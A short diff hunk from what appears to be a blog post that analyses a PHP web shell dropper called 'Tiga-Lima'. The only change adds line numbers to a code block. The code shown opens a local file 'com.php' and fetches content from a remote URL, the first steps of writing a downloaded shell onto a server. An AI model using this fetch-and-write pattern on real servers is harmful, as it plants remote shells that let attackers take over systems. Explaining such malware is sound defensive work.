@@ -17,7 +17,7 @@ This is a very simple script that attempts to write the contents of a remote fil
 
 ### Tiga-Lima remote shell source code
 
-{% highlight php %}<?php
+{% highlight php linenos %}<?php
 $namafile="com.php";
 $file = fopen($namafile ,'w+');
 $fa=file_get_contents('http://www.aliggroup.com/upload/log.txt');
